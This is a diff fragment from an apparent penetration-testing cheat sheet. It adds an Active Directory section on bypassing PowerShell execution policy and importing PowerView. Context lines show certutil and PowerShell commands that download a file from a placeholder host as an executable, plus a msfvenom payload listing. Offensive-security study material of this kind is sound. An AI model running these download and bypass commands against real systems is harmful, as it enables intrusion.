@@ -111,6 +111,10 @@ dir /a:h `show only hidden files`<br/>
 `certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`<br />
 `powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`
 
+### Active Directory
+`powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
+`. .\PowerView.ps1`      import the PowerView module
+
 # Msfvenom
 ### List All Payloads
 msfvenom -l payloads
